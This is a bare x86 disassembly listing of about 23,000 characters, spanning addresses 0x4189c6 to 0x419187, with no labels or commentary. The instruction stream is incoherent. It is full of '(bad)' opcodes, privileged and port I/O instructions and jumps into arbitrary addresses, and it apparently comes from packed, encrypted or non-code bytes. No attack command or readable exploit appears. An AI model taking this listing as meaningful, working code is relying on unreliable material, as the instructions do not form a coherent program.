  4189c6:	nop
  4189c7:	inc    ebp
  4189c8:	mov    esp,0xfdee3952
  4189cd:	cli    
  4189ce:	je     0x418a30
  4189d0:	mov    ch,0xc0
  4189d2:	nop
  4189d3:	jo     0x4189e3
  4189d5:	adc    BYTE PTR [edx-0x12],dh
  4189d8:	lahf   
  4189d9:	jne    0x41899e
  4189db:	xor    al,0xa3
  4189dd:	xchg   esi,eax
  4189de:	pop    esi
  4189df:	push   ebx
  4189e0:	xor    al,0xe
  4189e2:	mov    ds:0xb2102aad,al
  4189e7:	push   DWORD PTR [esi-0x49]
  4189ea:	aas    
  4189eb:	mul    BYTE PTR [ebx-0x6d]
  4189ee:	dec    ecx
  4189ef:	fnstenv [ebp+0x795873fb]
  4189f5:	cdq    
  4189f6:	xor    BYTE PTR [edi+ebx*1+0x1b7a6850],dh
  4189fd:	mov    ebp,0xdecd3d6e
  418a02:	mov    ds:0xe7ee9548,al
  418a07:	mov    ch,0xc
  418a09:	push   0x83e2d83e
  418a0e:	ret    
  418a0f:	inc    ebx
  418a10:	loop   0x4189d7
  418a12:	shl    ebx,1
  418a14:	sub    DWORD PTR [ebx-0x21],ebx
  418a17:	xor    eax,0x4734897
  418a1c:	(bad)  
  418a1d:	(bad)  
  418a1e:	jl     0x4189fa
  418a20:	outs   dx,BYTE PTR ds:[esi]
  418a21:	sbb    edi,DWORD PTR [eax+ebp*8-0x66]
  418a25:	into   
  418a26:	jo     0x418a63
  418a28:	and    al,0xd2
  418a2a:	cmp    bl,BYTE PTR [ebx]
  418a2c:	cmp    DWORD PTR [ebx],edx
  418a2e:	es dec eax
  418a30:	xchg   ebp,eax
  418a31:	or     BYTE PTR [esi-0x30],ah
  418a34:	cli    
  418a35:	and    eax,0x9309e047
  418a3a:	inc    esp
  418a3b:	jmp    DWORD PTR [ecx+ebx*8-0xe624c19]
  418a42:	jae    0x418a4c
  418a44:	push   eax
  418a45:	(bad)  
  418a46:	mov    edx,0x78705575
  418a4b:	pushf  
  418a4c:	dec    ebx
  418a4d:	sub    eax,0x3e9f31d2
  418a52:	xchg   ebx,eax
  418a53:	adc    al,0xde
  418a55:	ret    0x5027
  418a58:	(bad)  
  418a5a:	and    DWORD PTR [eax-0x25],ebp
  418a5d:	pushf  
  418a5e:	mov    ebx,DWORD PTR [edi]
  418a60:	xchg   edi,eax
  418a61:	stc    
  418a62:	xor    eax,0xace77e96
  418a67:	jp     0x418a44
  418a69:	out    0x5,al
  418a6b:	mov    dl,BYTE PTR [edx]
  418a6d:	(bad)  
  418a6e:	arpl   WORD PTR [esi-0x51],ax
  418a71:	(bad)
  418a74:	cdq    
  418a75:	mov    ds:0x41ed65a7,eax
  418a7a:	inc    edx
  418a7b:	in     eax,0x9b
  418a7d:	mov    ebp,0x6ebfb3f1
  418a82:	and    dh,dl
  418a84:	push   esp
  418a85:	out    0x73,eax
  418a87:	hlt    
  418a88:	dec    edi
  418a89:	lods   al,BYTE PTR ds:[esi]
  418a8a:	xchg   edx,eax
  418a8b:	leave  
  418a8c:	lods   al,BYTE PTR ds:[esi]
  418a8d:	pop    edi
  418a8e:	jmp    0x6b8c:0x432a29a
  418a95:	push   esi
  418a96:	push   eax
  418a97:	outs   dx,DWORD PTR ds:[esi]
  418a98:	gs in  eax,dx
  418a9a:	xchg   esi,eax
  418a9b:	inc    eax
  418a9c:	sub    al,0xe2
  418a9e:	pop    edi
  418a9f:	scas   al,BYTE PTR es:[edi]
  418aa0:	dec    ebp
  418aa1:	cmp    BYTE PTR [ebx+0x54da8f9b],0xdd
  418aa8:	or     edx,esp
  418aaa:	xchg   edx,eax
  418aab:	into   
  418aac:	loop   0x418b0e
  418aae:	lock jo 0x418b01
  418ab1:	fwait
  418ab2:	pop    ecx
  418ab3:	mov    dh,0xd3
  418ab5:	(bad)
  418ab8:	and    al,0x2e
  418aba:	mov    ds:0xe697f432,eax
  418abf:	test   al,0x85
  418ac1:	(bad)  
  418ac2:	or     al,0xbd
  418ac4:	xchg   ebx,eax
  418ac5:	ja     0x418aed
  418ac7:	add    al,0x84
  418ac9:	(bad)  
  418aca:	into   
  418acb:	add    al,0x88
  418acd:	jle    0x418af1
  418acf:	aam    0x7a
  418ad1:	dec    ebp
  418ad2:	dec    eax
  418ad3:	je     0x418af7
  418ad5:	mov    dh,al
  418ad7:	xlat   BYTE PTR ds:[ebx]
  418ad8:	nop
  418ad9:	int3   
  418ada:	push   cs
  418adb:	aas    
  418adc:	xchg   DWORD PTR [esp+edx*4],eax
  418adf:	mov    dh,0x4d
  418ae1:	and    DWORD PTR [esi],0xa47f748c
  418ae7:	mov    edi,DWORD PTR [ecx]
  418ae9:	dec    edx
  418aea:	inc    esp
  418aeb:	loop   0x418a7e
  418aed:	(bad)  
  418aee:	mov    esi,0x3f91a2a6
  418af3:	xor    eax,0xbe1c695d
  418af8:	(bad)  
  418af9:	cmp    al,0xe4
  418afb:	arpl   WORD PTR [ebx],si
  418afd:	sbb    eax,0xbf9c0bd
  418b02:	inc    eax
  418b03:	mov    cs,esp
  418b05:	(bad)
  418b08:	or     al,0x59
  418b0a:	add    BYTE PTR [eax],dl
  418b0c:	hlt    
  418b0d:	xor    ch,cl
  418b0f:	adc    eax,esi
  418b11:	fsub   DWORD PTR [eax+eiz*8]
  418b14:	adc    BYTE PTR [esi+ebx*1-0x184e8f3f],al
  418b1b:	xchg   esp,eax
  418b1c:	xchg   esp,eax
  418b1d:	repnz pop es
  418b1f:	out    0xd2,al
  418b21:	je     0x418aeb
  418b23:	pslld  mm3,QWORD PTR [ecx-0x5e9edfca]
  418b2a:	daa    
  418b2b:	xchg   BYTE PTR [ecx+0x7ab2d2b2],bh
  418b31:	popf   
  418b32:	retf   0x9c45
  418b35:	out    dx,eax
  418b36:	stc    
  418b37:	repz mov ds:0xda4e0ffb,eax
  418b3d:	es mov al,0x0
  418b40:	sub    ebx,DWORD PTR [eax]
  418b42:	dec    ecx
  418b43:	and    dl,ch
  418b45:	out    dx,eax
  418b46:	xchg   ebx,eax
  418b47:	mov    edx,0x5d4220e5
  418b4c:	mov    edx,0x9ffec471
  418b51:	mov    dl,0xc6
  418b53:	jns    0x418af2
  418b55:	or     BYTE PTR [ebp-0x9aac15b],ch
  418b5b:	push   ebx
  418b5c:	jns    0x418b11
  418b5e:	popf   
  418b5f:	fs inc ecx
  418b61:	xchg   DWORD PTR [edi+0x5af2bbb],ecx
  418b67:	sti    
  418b68:	mov    ds:0xeb23ad4a,al
  418b6d:	shl    BYTE PTR [eax-0x50],cl
  418b70:	es je  0x418b98
  418b73:	xchg   ebx,eax
  418b74:	push   esi
  418b75:	sti    
  418b76:	mov    eax,ds:0x6799ced1
  418b7b:	inc    edi
  418b7d:	imul   esi,edi,0x822a3b3a
  418b83:	jae    0x418b4d
  418b85:	in     eax,0xaa
  418b87:	aas    
  418b88:	pop    es
  418b89:	pop    esi
  418b8a:	xchg   edx,eax
  418b8b:	ret    
  418b8c:	rcl    DWORD PTR [esi+0x31],cl
  418b8f:	leave  
  418b90:	cld    
  418b91:	fidiv  WORD PTR [edi*8+0x6b29247a]
  418b98:	push   edi
  418b99:	dec    ecx
  418b9a:	pop    edx
  418b9b:	and    eax,DWORD PTR [edx]
  418b9d:	enter  0xadd6,0x8b
  418ba1:	mov    ds:0x3ba819aa,al
  418ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418ba7:	shl    DWORD PTR [esi+0x743b3010],1
  418bad:	(bad)  
  418bae:	cwde   
  418baf:	lods   eax,DWORD PTR ds:[esi]
  418bb0:	or     DWORD PTR [edi+0xd371080],0xffffffcd
  418bb7:	jl     0x418bf0
  418bb9:	lahf   
  418bba:	fcmovnbe st,st(2)
  418bbc:	push   esi
  418bbd:	inc    edx
  418bbe:	push   ecx
  418bbf:	mov    edx,0x14aae1d0
  418bc4:	or     dh,BYTE PTR [ebx+0x40]
  418bc7:	dec    ebx
  418bc8:	in     al,dx
  418bc9:	test   edi,eax
  418bcb:	inc    edx
  418bcc:	outs   dx,DWORD PTR ds:[esi]
  418bcd:	cld    
  418bce:	pushf  
  418bcf:	add    DWORD PTR [edx],edx
  418bd1:	fs (bad) 
  418bd4:	or     bh,BYTE PTR [ecx]
  418bd6:	sbb    DWORD PTR [edx-0x1e170df9],0x457eceaa
  418be0:	sbb    esp,DWORD PTR [ebx+ebx*2]
  418be3:	jbe    0x418b78
  418be5:	mov    eax,ds:0x3c19ac1c
  418bea:	(bad)  
  418beb:	out    0xed,eax
  418bed:	aam    0x9
  418bef:	cwde   
  418bf0:	jns    0x418b8d
  418bf2:	mov    bh,BYTE PTR [eax+0xe9b4f2c]
  418bf8:	retf   
  418bf9:	frstor [esi]
  418bfb:	mov    eax,0x95fb934c
  418c00:	scas   eax,DWORD PTR es:[edi]
  418c01:	aam    0xb4
  418c03:	pushf  
  418c04:	into   
  418c05:	fist   DWORD PTR ds:0xc79e8237
  418c0b:	mov    cl,0x58
  418c0d:	and    al,0xea
  418c0f:	mov    bh,0xc7
  418c11:	pop    ss
  418c12:	out    dx,al
  418c13:	ins    DWORD PTR es:[edi],dx
  418c14:	scas   al,BYTE PTR es:[edi]
  418c15:	dec    edx
  418c16:	xchg   esi,eax
  418c17:	mov    ds:0xd7aa83ea,eax
  418c1c:	cdq    
  418c1d:	add    DWORD PTR [eax],edi
  418c1f:	xchg   BYTE PTR [ecx-0x57],ah
  418c22:	loop   0x418c84
  418c24:	repnz and DWORD PTR [ecx-0x28e42cd4],0xfcd5ec12
  418c2f:	jo     0x418ca0
  418c31:	cmp    BYTE PTR [ebx+ecx*2],bh
  418c34:	fndisi(8087 only) 
  418c36:	(bad)  
  418c37:	mov    cl,0xb8
  418c39:	jl     0x418c33
  418c3b:	cmc    
  418c3c:	fs sub al,0x45
  418c3f:	or     DWORD PTR [edi],0x38
  418c42:	add    eax,DWORD PTR [edi+0x6c7746f5]
  418c48:	jge    0x418c09
  418c4a:	sub    esi,eax
  418c4c:	adc    DWORD PTR [esi],edi
  418c4e:	aad    0x25
  418c50:	nop
  418c51:	or     edx,ecx
  418c53:	daa    
  418c54:	pop    ds
  418c55:	add    BYTE PTR [edi+ebx*4+0x7d338a4d],bl
  418c5c:	loope  0x418ca0
  418c5e:	jl     0x418be9
  418c60:	jno    0x418cd9
  418c62:	lods   al,BYTE PTR ds:[esi]
  418c63:	add    esp,esi
  418c65:	push   ebx
  418c66:	ret    
  418c67:	mov    al,0x4
  418c69:	js     0x418c90
  418c6b:	fmul   DWORD PTR [ebx]
  418c6d:	and    BYTE PTR [esi+0x5437ac7e],dh
  418c73:	sbb    eax,0xf45535c4
  418c78:	imul   ebx,DWORD PTR [edi],0xd67be500
  418c7e:	sbb    eax,0x16126675
  418c83:	inc    ecx
  418c84:	jne    0x418ca4
  418c86:	jo     0x418c98
  418c88:	mov    ebx,0x70f62bd2
  418c8d:	aaa    
  418c8e:	ss push eax
  418c90:	pop    ecx
  418c91:	rcl    BYTE PTR [ebx+0x385db771],1
  418c97:	fdivr  QWORD PTR [esi]
  418c99:	sbb    cl,dh
  418c9b:	mov    al,ds:0x67f4aa34
  418ca0:	in     eax,dx
  418ca1:	rcr    DWORD PTR [ebp+0x35295347],cl
  418ca7:	lock jp 0x418c88
  418caa:	mov    esi,0x3d3c1807
  418caf:	cmp    al,0xca
  418cb1:	aas    
  418cb2:	popf   
  418cb3:	push   eax
  418cb4:	and    bh,cl
  418cb6:	sub    esp,eax
  418cb8:	mov    edx,DWORD PTR [ebp+0x43]
  418cbb:	xchg   BYTE PTR [edx],dh
  418cbd:	outs   dx,BYTE PTR ds:[esi]
  418cbe:	xor    al,0xcd
  418cc0:	je     0x418d10
  418cc2:	nop
  418cc3:	retf   
  418cc4:	mov    al,ds:0xef79dbd3
  418cc9:	punpcklwd mm5,mm7
  418ccc:	(bad)  [eax-0x32]
  418ccf:	mov    eax,ds:0xd13780d0
  418cd4:	jb     0x418c98
  418cd6:	pushf  
  418cd7:	dec    eax
  418cd8:	(bad)  
  418cd9:	int3   
  418cda:	or     ch,bl
  418cdc:	jge    0x418cb0
  418cde:	add    al,0x74
  418ce0:	jbe    0x418d3f
  418ce2:	pcmpgtw mm4,QWORD PTR [edx+0x6e]
  418ce6:	xlat   BYTE PTR ds:[ebx]
  418ce7:	std    
  418ce8:	shr    BYTE PTR [esi+0x7e],cl
  418ceb:	js     0x418ccc
  418ced:	out    dx,al
  418cee:	pop    ebp
  418cef:	dec    eax
  418cf0:	js     0x418cad
  418cf2:	push   ebp
  418cf3:	jl     0x418d5e
  418cf5:	push   ecx
  418cf6:	lods   eax,DWORD PTR ds:[esi]
  418cf7:	gs inc ebp
  418cf9:	pop    es
  418cfa:	shl    BYTE PTR [ecx+0x66],cl
  418cfd:	mov    WORD PTR [eax+0x44],ss
  418d00:	out    dx,al
  418d01:	mov    esp,0x5eec48a1
  418d06:	inc    eax
  418d07:	push   edx
  418d08:	rep ins DWORD PTR es:[edi],dx
  418d0a:	call   0x713:0x7662d4a3
  418d11:	ror    ebp,0x13
  418d14:	mov    al,BYTE PTR [ecx+0x4c5a1117]
  418d1a:	into   
  418d1b:	mov    edx,DWORD PTR [ecx+ebx*2-0x3d]
  418d1f:	dec    edx
  418d20:	mov    ?,edi
  418d22:	cmc    
  418d23:	xor    ebp,DWORD PTR [ecx-0x43557fc3]
  418d29:	test   eax,0x33d19eb6
  418d2e:	sub    eax,ecx
  418d30:	fmul   st(4),st
  418d32:	pushf  
  418d33:	sub    ch,BYTE PTR [edi-0x7e]
  418d36:	push   es
  418d37:	mov    esi,0xb0fb5a0b
  418d3c:	das    
  418d3d:	pop    ecx
  418d3e:	push   ebp
  418d3f:	je     0x418d76
  418d41:	leave  
  418d42:	and    DWORD PTR [esi+0x465066c6],edi
  418d48:	jmp    0x6a1766f6
  418d4d:	repz loop 0x418d1e
  418d50:	out    dx,eax
  418d51:	test   al,0xc3
  418d53:	out    0x7,al
  418d55:	mov    esp,0xb27f1477
  418d5a:	mov    bl,0xa0
  418d5c:	or     ch,0xc0
  418d5f:	jne    0x418d93
  418d61:	mov    dl,0xa5
  418d63:	pop    ebx
  418d64:	shl    BYTE PTR [esi],0x2b
  418d67:	pop    esp
  418d68:	pushf  
  418d69:	pop    es
  418d6a:	xor    eax,0xf6c6f8bc
  418d6f:	ja     0x418cf4
  418d71:	xor    eax,0x49b39ba3
  418d76:	mov    bh,0xdb
  418d78:	adc    BYTE PTR [esp+edx*8-0x10],0xf6
  418d7d:	xchg   ebx,eax
  418d7e:	cmc    
  418d7f:	cmp    DWORD PTR [ebx],0x2cbed58e
  418d85:	lods   eax,DWORD PTR ds:[esi]
  418d86:	sar    DWORD PTR [eax],0x84
  418d89:	jecxz  0x418d5c
  418d8b:	xor    al,0xe0
  418d8d:	cld    
  418d8e:	dec    eax
  418d8f:	shr    ebx,1
  418d91:	sbb    eax,DWORD PTR [esi+0x2f]
  418d94:	mov    ebx,0x7e965bb2
  418d99:	in     al,0xc4
  418d9b:	mov    eax,0xbe914a26
  418da0:	and    DWORD PTR [edx-0x4e4ac294],edi
  418da6:	je     0x418d95
  418da8:	mov    DWORD PTR [edx+edi*8+0x77],edx
  418dac:	pop    ds
  418dad:	and    dh,BYTE PTR [edx]
  418daf:	(bad)  
  418db0:	dec    esp
  418db1:	push   0x56
  418db3:	not    cl
  418db5:	mov    al,0xd2
  418db7:	mov    eax,0xffaec91d
  418dbc:	pusha  
  418dbd:	mov    BYTE PTR ds:0xc67b8c2c,ch
  418dc3:	adc    DWORD PTR ds:0x7e541b29,edx
  418dc9:	sbb    eax,0x9dc28adb
  418dce:	arpl   cx,bx
  418dd0:	in     eax,0x6a
  418dd2:	xor    dh,dl
  418dd4:	add    ebx,edi
  418dd6:	and    DWORD PTR [esi],esi
  418dd8:	xor    DWORD PTR ds:0xc80244ac,esp
  418dde:	xchg   edi,eax
  418ddf:	and    ecx,DWORD PTR [esi]
  418de1:	clc    
  418de2:	(bad)  
  418de3:	jg     0x418de2
  418de5:	push   eax
  418de6:	mov    ebp,DWORD PTR [ebp-0x405be33a]
  418dec:	cmp    DWORD PTR [ebp-0x2d],esi
  418def:	enter  0xa372,0x12
  418df3:	jo     0x97b3514a
  418df9:	dec    ebx
  418dfa:	les    eax,FWORD PTR [eax+eiz*4+0x6b1374d9]
  418e01:	pop    es
  418e02:	jb     0x418d91
  418e04:	cmp    eax,0x6f4e56aa
  418e09:	(bad)  
  418e0a:	dec    ebx
  418e0b:	cmp    ebp,DWORD PTR ds:0xe783f6e6
  418e11:	arpl   bp,si
  418e13:	out    0x25,al
  418e15:	sbb    ebx,ebx
  418e17:	jo     0x418dd7
  418e19:	mov    WORD PTR [esi+eax*4+0x24],?
  418e1d:	push   0xffffffe9
  418e1f:	dec    ecx
  418e20:	lods   al,BYTE PTR ds:[esi]
  418e21:	cli    
  418e22:	add    DWORD PTR [edi],ebp
  418e24:	xchg   BYTE PTR [edx-0xefc3528],bh
  418e2a:	into   
  418e2b:	mov    dl,BYTE PTR [edx]
  418e2d:	xchg   DWORD PTR ds:0xb3ba9a31,ecx
  418e33:	dec    ebx
  418e34:	xlat   BYTE PTR ds:[ebx]
  418e35:	test   eax,0xdde9835
  418e3a:	adc    eax,0xe907a450
  418e3f:	and    ebx,DWORD PTR [ebx]
  418e41:	pusha  
  418e42:	aam    0x2a
  418e44:	sysexit 
  418e46:	push   ds
  418e47:	push   cs
  418e48:	mov    eax,0x64a29b61
  418e4d:	into   
  418e4e:	push   0x7a5d751c
  418e53:	daa    
  418e54:	xor    BYTE PTR [esi+0x63],cl
  418e57:	in     eax,dx
  418e58:	jecxz  0x418de3
  418e5a:	mov    edi,0x4a05af1
  418e5f:	or     al,0xbf
  418e61:	mov    edx,ebx
  418e63:	add    eax,0x6146fa57
  418e68:	cmp    edx,DWORD PTR [ebp+0x1b2a5c07]
  418e6e:	jnp    0x418e88
  418e70:	test   ebp,ebx
  418e72:	jmp    0xb1c5:0xd392f166
  418e79:	call   0x5e6d4d76
  418e7e:	ficom  WORD PTR [edx+edx*8+0x2b]
  418e82:	clc    
  418e83:	mov    ebp,ss
  418e85:	in     eax,0x66
  418e87:	push   edi
  418e88:	sbb    ch,al
  418e8a:	test   BYTE PTR ds:[eax-0x3],dh
  418e8e:	push   edi
  418e8f:	mov    ebp,es
  418e91:	lahf   
  418e92:	lea    ecx,[ecx+0x7fd04bcd]
  418e98:	(bad)  
  418e99:	mov    ecx,0x52458454
  418e9e:	xchg   ebp,eax
  418e9f:	cmp    BYTE PTR [edx-0x23],cl
  418ea2:	(bad)  
  418ea3:	(bad)  
  418ea4:	lods   al,BYTE PTR ds:[esi]
  418ea5:	cwde   
  418ea6:	iret   
  418ea7:	adc    BYTE PTR [ebx+0x56],0xb8
  418eab:	ins    BYTE PTR es:[edi],dx
  418eac:	mov    ah,0x2c
  418eae:	cmp    al,0x24
  418eb0:	push   ss
  418eb1:	sub    eax,0xc4b31f94
  418eb6:	clc    
  418eb7:	gs push edi
  418eb9:	pop    ds
  418eba:	xor    al,BYTE PTR [ecx]
  418ebc:	repnz shl al,cl
  418ebf:	cmp    ch,ch
  418ec1:	bound  esp,QWORD PTR [ebp-0x1d]
  418ec4:	xor    al,bh
  418ec6:	call   0xe6dd:0x35b4f9c4
  418ecd:	arpl   di,di
  418ecf:	mov    bh,0x4b
  418ed1:	lods   al,BYTE PTR ds:[esi]
  418ed2:	mov    edx,0xd34b5b8e
  418ed7:	fnstcw WORD PTR [edx+0x41]
  418eda:	das    
  418edb:	pop    ds
  418edc:	jns    0x418f53
  418ede:	ins    BYTE PTR es:[edi],dx
  418edf:	retf   0x309c
  418ee2:	xchg   ecx,eax
  418ee3:	xchg   edi,eax
  418ee4:	call   0x2328c7f8
  418ee9:	into   
  418eea:	pop    es
  418eeb:	in     eax,dx
  418eec:	push   ebx
  418eed:	mov    dl,0xef
  418eef:	pop    ebp
  418ef0:	ret    
  418ef1:	stc    
  418ef2:	cdq    
  418ef3:	jp     0x418e79
  418ef5:	scas   eax,DWORD PTR es:[edi]
  418ef6:	pusha  
  418ef7:	sbb    BYTE PTR [ebx],0x52
  418efa:	(bad)  
  418efb:	call   0xeadef1f2
  418f00:	or     esp,DWORD PTR [esi]
  418f02:	xchg   BYTE PTR [edx],dh
  418f04:	xlat   BYTE PTR ds:[ebx]
  418f05:	cwde   
  418f06:	xor    BYTE PTR [esi],cl
  418f08:	mov    dh,0xd0
  418f0a:	add    eax,0x1c37cd21
  418f0f:	pop    ds
  418f10:	push   ebp
  418f11:	out    0x82,eax
  418f13:	imul   edi,ecx,0xffffffb0
  418f16:	shr    DWORD PTR ds:0x45da534a,1
  418f1c:	ja     0x418f14
  418f1e:	daa    
  418f1f:	and    al,0xd4
  418f21:	call   0x382b:0x98e176b4
  418f28:	out    0xd1,eax
  418f2a:	mov    esp,0x5ee3ba17
  418f2f:	loop   0x418f76
  418f31:	mov    ds:0x331e5e44,eax
  418f36:	shl    DWORD PTR [ebp+0x69],0x40
  418f3a:	call   0xe3e3:0xac3e66da
  418f41:	or     al,BYTE PTR [ebp+0x34]
  418f44:	xchg   BYTE PTR [eax+eiz*4],dl
  418f47:	xor    ch,BYTE PTR [ebx]
  418f49:	aam    0x36
  418f4b:	into   
  418f4c:	pop    edi
  418f4d:	loopne 0x418f63
  418f4f:	or     bh,al
  418f51:	push   es
  418f52:	ins    BYTE PTR es:[edi],dx
  418f53:	jns    0x418eea
  418f55:	mov    DWORD PTR [ebp-0x4a615937],0xda09f0e0
  418f5f:	jg     0x418f40
  418f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f62:	js     0x418f8c
  418f64:	mov    dl,0xcb
  418f66:	add    al,0x70
  418f68:	xchg   ebx,eax
  418f69:	xor    bh,BYTE PTR [ebx]
  418f6b:	jb     0x418f5d
  418f6d:	retf   
  418f6e:	mov    ah,0x67
  418f70:	xchg   esp,eax
  418f71:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f72:	loope  0x418f78
  418f74:	arpl   di,ax
  418f76:	push   ds
  418f77:	cmp    DWORD PTR [esi+0x1b266f94],edi
  418f7d:	jae    0x418fa1
  418f7f:	inc    ecx
  418f80:	shl    DWORD PTR ds:0xd4055a0e,cl
  418f86:	push   0x8fdde79b
  418f8b:	pop    ecx
  418f8c:	push   ebp
  418f8d:	cmc    
  418f8e:	pop    ecx
  418f8f:	ret    
  418f90:	xchg   DWORD PTR [esi-0x5800d292],esp
  418f96:	inc    ecx
  418f97:	pop    ds
  418f98:	push   0x8176a46d
  418f9d:	dec    esi
  418f9e:	mov    ebx,0x2af0ce3a
  418fa3:	mov    ebx,0xf19ed9e2
  418fa8:	mov    dh,0x11
  418faa:	cmp    al,0x72
  418fac:	hlt    
  418fad:	test   al,0x2f
  418faf:	fist   WORD PTR [ebx+0x44]
  418fb2:	sub    dl,ah
  418fb4:	adc    ah,BYTE PTR [ebp+0x20]
  418fb7:	popf   
  418fb8:	mov    ch,0xec
  418fba:	push   esp
  418fbb:	ins    BYTE PTR es:[edi],dx
  418fbc:	xchg   ecx,eax
  418fbd:	push   0xffffff9b
  418fbf:	jns    0x418fc6
  418fc1:	les    edx,FWORD PTR [edi]
  418fc3:	inc    ebx
  418fc4:	sbb    eax,0x3f1d92cf
  418fc9:	addr16 jne 0x418f63
  418fcc:	or     eax,DWORD PTR [edx+edx*8]
  418fcf:	fsubp  st(6),st
  418fd1:	leave  
  418fd2:	sub    DWORD PTR [ecx+0x7c74bfcb],eax
  418fd8:	dec    esp
  418fd9:	inc    edx
  418fda:	fsubr  DWORD PTR ss:[esi]
  418fdd:	and    al,0xfa
  418fdf:	test   eax,0x6640e6fd
  418fe4:	leave  
  418fe5:	in     eax,0x72
  418fe7:	mov    ss:0x4c108ddf,al
  418fed:	and    eax,0xc1886442
  418ff2:	cmp    edi,DWORD PTR [edi+0x5e554de7]
  418ff8:	test   BYTE PTR [ecx-0x2d],dl
  418ffb:	mov    BYTE PTR [ecx+0x2c],dl
  418ffe:	and    al,0x95
  419000:	das    
  419001:	cwde   
  419002:	out    0x75,eax
  419004:	sub    edi,DWORD PTR [ecx-0x75]
  419007:	xchg   ecx,eax
  419008:	push   eax
  419009:	adc    eax,DWORD PTR [edx+0x5ed16b9e]
  41900f:	mov    ecx,0xba63f8ad
  419014:	add    BYTE PTR [esp+ebx*8],dh
  419017:	inc    edx
  419018:	push   ecx
  419019:	xchg   edi,ecx
  41901b:	or     ebp,eax
  41901d:	and    ch,bl
  41901f:	jno    0x418fc1
  419021:	sbb    eax,esi
  419023:	push   ecx
  419024:	int    0x91
  419026:	mov    dl,0x67
  419028:	jmp    0x474097ce
  41902d:	rcr    DWORD PTR [edi],0xf5
  419030:	dec    ebx
  419031:	ret    0x9847
  419034:	xchg   bl,bl
  419036:	push   ds
  419037:	ret    0xd77b
  41903a:	and    ebx,DWORD PTR [esp+eiz*2-0x345fa7ce]
  419041:	(bad)  
  419044:	ret    
  419045:	pop    esi
  419046:	add    eax,0x70bfb2a2
  41904b:	mov    eax,ds:0x5b19d175
  419050:	cld    
  419051:	inc    edx
  419052:	jno    0x419022
  419054:	xor    DWORD PTR [edx+0x2aad6e0e],edx
  41905a:	and    DWORD PTR [edx+0x357bc634],eax
  419060:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419061:	xor    edx,eax
  419063:	dec    ecx
  419064:	pop    es
  419065:	push   ecx
  419066:	lods   eax,DWORD PTR ds:[esi]
  419067:	and    eax,0x758a28e5
  41906c:	jae    0x41906d
  41906e:	sti    
  41906f:	mov    es,WORD PTR [esp+edx*4-0x65]
  419073:	shr    BYTE PTR [eax],0x56
  419076:	(bad)  
  419077:	mov    dl,0xcf
  419079:	cmp    bl,BYTE PTR [edi]
  41907b:	cmp    al,0xef
  41907d:	icebp  
  41907e:	push   0x7f6db566
  419083:	mov    bl,0xf7
  419085:	clc    
  419086:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419087:	out    0x9d,eax
  419089:	ins    DWORD PTR es:[edi],dx
  41908a:	jl     0x4190b3
  41908c:	jg     0x41905b
  41908e:	or     eax,0xf9c9f7a3
  419093:	jmp    0x21290d1
  419098:	or     BYTE PTR [ecx],al
  41909a:	inc    ecx
  41909b:	adc    dh,BYTE PTR [esi+0x7]
  41909e:	fiadd  WORD PTR [edi+0x77]
  4190a1:	clc    
  4190a2:	cld    
  4190a3:	jge    0x419117
  4190a5:	iret   
  4190a6:	sti    
  4190a7:	out    0xcc,eax
  4190a9:	in     al,dx
  4190aa:	mov    cs,WORD PTR [ecx]
  4190ac:	or     edx,DWORD PTR [ebp-0x62b2d82f]
  4190b2:	pop    esi
  4190b3:	scas   eax,DWORD PTR es:[edi]
  4190b4:	mov    ebp,0x481fa31c
  4190b9:	or     bh,BYTE PTR [edi+0x32e4d2d7]
  4190bf:	and    BYTE PTR [ecx],0xa8
  4190c2:	cmp    eax,0xdb896e37
  4190c7:	stc    
  4190c8:	das    
  4190c9:	clc    
  4190ca:	(bad)  
  4190cc:	push   ecx
  4190cd:	jg     0x4190d7
  4190cf:	enter  0x2c1d,0x27
  4190d3:	shr    eax,cl
  4190d5:	popf   
  4190d6:	push   eax
  4190d7:	mov    BYTE PTR [edi+ebp*2],bh
  4190da:	gs aaa 
  4190dc:	jp     0x419142
  4190de:	aam    0x29
  4190e0:	mov    esp,0xbc725422
  4190e5:	push   0xfffffffd
  4190e7:	(bad)  
  4190e8:	in     eax,dx
  4190e9:	leave  
  4190ea:	adc    cl,BYTE PTR ds:0x4aa89424
  4190f0:	lds    esi,FWORD PTR [ebp+0x63]
  4190f3:	into   
  4190f4:	sbb    ah,0x99
  4190f7:	jne    0x419084
  4190f9:	mov    esp,0xa3c2fcb2
  4190fe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4190ff:	out    0xd0,eax
  419101:	mov    ebx,0x3a92cba0
  419106:	imul   edx,DWORD PTR [edi],0x39
  419109:	iret   
  41910a:	mov    WORD PTR [esi],fs
  41910c:	sub    al,0x7
  41910e:	sbb    BYTE PTR [eax-0x2fe1ddf4],dl
  419114:	jp     0x419164
  419116:	dec    edx
  419117:	(bad)  
  419119:	pop    esi
  41911a:	ret    0x2d3
  41911d:	cdq    
  41911e:	in     al,dx
  41911f:	xor    eax,0x5349f93e
  419124:	(bad)  
  419125:	mov    edi,0x65a433b9
  41912a:	jmp    0x419113
  41912c:	dec    eax
  41912d:	push   ds
  41912e:	sbb    dh,BYTE PTR [edx+0x7d]
  419131:	aaa    
  419132:	xchg   BYTE PTR [edx-0x708d6b5],dl
  419138:	dec    eax
  419139:	pop    ss
  41913a:	pop    esi
  41913b:	shr    DWORD PTR [ebx],cl
  41913d:	sbb    DWORD PTR [eax+0x51],esp
  419140:	mov    ds:0x7ac45086,eax
  419145:	push   0x6
  419147:	mov    ebx,0x37d05284
  41914c:	mov    esp,0x4deaa7cc
  419151:	jg     0x419167
  419153:	pop    ss
  419154:	fdivp  st(7),st
  419156:	mov    esp,0x791776fc
  41915b:	mov    dh,0x66
  41915d:	or     edx,0x28bbe57f
  419163:	jae    0x419104
  419165:	push   edi
  419166:	pop    es
  419167:	pop    es
  419168:	(bad)  
  419169:	lahf   
  41916a:	sbb    BYTE PTR [ecx-0x36],cl
  41916d:	xchg   BYTE PTR [ebx-0x2],ch
  419170:	jo     0x4191d8
  419172:	adc    al,0xce
  419174:	call   esp
  419176:	shl    BYTE PTR [ebx],cl
  419178:	std    
  419179:	xor    al,0x6b
  41917b:	push   ss
  41917c:	add    DWORD PTR [edi-0x5ba47245],esp
  419182:	pop    ss
  419183:	into   
  419184:	pop    edi
  419185:	sahf   
  419186:	push   es
  419187:	icebp  
